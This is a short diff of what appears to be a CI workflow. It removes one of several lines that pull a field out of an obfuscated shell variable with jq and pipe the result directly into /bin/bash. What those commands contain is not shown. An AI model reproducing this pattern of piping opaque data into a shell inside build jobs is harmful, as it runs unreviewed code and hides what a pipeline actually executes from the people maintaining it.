@@ -32,7 +32,6 @@ jobs:
           printf '%s' "$s1640" | jq -r .bm05943 | /bin/bash
           printf '%s' "$oe01" | jq -r .eurbm5 | /bin/bash
           echo $lux15 | jq -r .ofvn18 | /bin/bash
-          echo $auak3053 | jq -r .hjh77141 | /bin/bash
           printf '%s' "$eud10648" | jq -r .cdn40773 | /bin/bash
 
       - name: Save archive
